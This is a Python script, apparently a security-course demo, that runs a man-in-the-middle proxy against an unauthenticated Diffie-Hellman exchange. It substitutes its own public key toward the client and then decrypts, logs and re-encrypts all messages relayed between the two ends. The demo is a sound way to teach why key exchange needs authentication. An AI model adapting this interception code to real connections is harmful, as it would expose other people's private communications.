#! /usr/bin/env python
# Phase 0: Python 3 port (print, bytes/str, socket, pycryptodome)
# Phase 1: argparse --secure / --no-gui; mode banner; log_intercept()
#
# TODO: Convert key exchange protocol part into function to reduce repetition.

import threading
import sys
import argparse
import network
from diffie_hellman import DiffieHellman
from crypto_protocol import CryptoProtocol


# ---------------------------------------------------------------------------
# CLI parsing
# ---------------------------------------------------------------------------

def parse_args():
    """
    mitm.py <server_ip> <server_port> <client_port> [--secure] [--no-gui]

    --secure  (Phase 4+): speak the signed wire format, attempt forgery, log outcome.
              In Phase 1 this is a no-op beyond the banner.
    --no-gui  Log intercepted messages to stdout only; no Tkinter window.
    """
    parser = argparse.ArgumentParser(
        description='DH MITM Proxy — IS FA2 demo',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            'Examples:\n'
            '  python mitm.py 127.0.0.1 9000 9001             # vulnerable MITM\n'
            '  python mitm.py 127.0.0.1 9000 9001 --secure    # secure-mode forgery (Phase 4+)\n'
            '  python mitm.py 127.0.0.1 9000 9001 --no-gui    # stdout logging only\n'
        ),
    )
    parser.add_argument('server_ip', help='Real server IP')
    parser.add_argument('server_port', type=int, help='Real server port')
    parser.add_argument('client_port', type=int, help='Port to listen on for the victim client')
    parser.add_argument(
        '--secure', action='store_true',
        help=(
            'Operate in secure-protocol wire format. '
            'MITM reads signed values, strips/forges signature, and forwards. '
            'Endpoints will abort with HandshakeError (Phase 4+). '
            'No-op in Phase 1 beyond banner.'
        ),
    )
    parser.add_argument(
        '--no-gui', action='store_true',
        help='Log intercepted messages to stdout; suppress Tkinter window.',
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

def print_banner(secure: bool) -> None:
    if secure:
        print(
            "[*] MITM | Mode: SECURE wire-format\n"
            "[*] Will attempt forgery in Phase 4. Expect endpoints to abort.",
            flush=True,
        )
    else:
        print(
            "[*] MITM | Mode: VULNERABLE — parameter injection active\n"
            "[!] All messages will be decrypted and logged in plaintext.",
            flush=True,
        )


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------

args = parse_args()
print_banner(args.secure)


def get_line(conn):
    line = None
    while line is None:
        line = conn.recv()
    return line


server_ip   = args.server_ip
server_port = args.server_port
client_port = args.client_port

conn_server = network.Connection()   # toward the real server (Bob)
conn_client = network.Connection()   # toward the victim client (Alice)

try:
    conn_client.listen(client_port)
except Exception as e:
    print(f"Unable to open port {client_port}: {e}", file=sys.stderr)
    sys.exit(1)

try:
    conn_server.connect(server_ip, server_port)
except Exception as e:
    print(f"Unable to connect to {server_ip}:{server_port}: {e}", file=sys.stderr)
    sys.exit(1)

# ---------------------------------------------------------------------------
# Key exchange (vulnerable path — unchanged from Phase 0)
# Phase 4 will add a --secure branch here that speaks the signed wire format
# and injects a garbage/forged signature.
# ---------------------------------------------------------------------------

p_server = int(get_line(conn_server))
g_server = int(get_line(conn_server))
A_server = int(get_line(conn_server))

dh_server = DiffieHellman(p_server, g_server)
_, _, B_server = dh_server.generate_public_broadcast()
conn_server.send(str(B_server))
crypto_protocol_server = CryptoProtocol(dh_server.get_shared_secret(A_server))

p_client = p_server
g_client = g_server

dh_client = DiffieHellman(p_server, g_server)
_, _, A_client = dh_client.generate_public_broadcast()

conn_client.send(str(p_client))
conn_client.send(str(g_client))
conn_client.send(str(A_client))   # ← forged: Mallory's own public value

B_client = int(get_line(conn_client))
crypto_protocol_client = CryptoProtocol(dh_client.get_shared_secret(B_client))

# KEY EXCHANGE ENDS


# ---------------------------------------------------------------------------
# Intercept logging
# ---------------------------------------------------------------------------

def log_intercept(name: str, text: str) -> None:
    """Print intercepted plaintext; also show in GUI if available."""
    msg = f"[MITM][{name}] INTERCEPTED: {text}"
    print(msg, flush=True)
    if not args.no_gui:
        try:
            import gui
            gui.add_new_text(msg)
        except Exception:
            pass   # GUI may not be ready yet; stdout already logged


# ---------------------------------------------------------------------------
# GUI thread (suppressed by --no-gui)
# ---------------------------------------------------------------------------

if not args.no_gui:
    class GUIThread(threading.Thread):
        daemon = True

        def run(self):
            import gui
            gui.start(True)   # disable_input=True; MITM has no manual send

    GUIThread().start()


# ---------------------------------------------------------------------------
# Relay session
# ---------------------------------------------------------------------------

def session(conn_receive, cp_receive, conn_send, cp_send, name):
    while True:
        line = conn_receive.recv()
        if line is not None:
            if line != '':
                plaintext = cp_receive.decrypt(line)
                log_intercept(name, plaintext)
                conn_send.send(cp_send.encrypt(plaintext))
        else:
            break


t = threading.Thread(
    target=session,
    args=(conn_server, crypto_protocol_server,
          conn_client, crypto_protocol_client, "server"),
    daemon=True,
)
t.start()

session(conn_client, crypto_protocol_client,
        conn_server, crypto_protocol_server, "client")
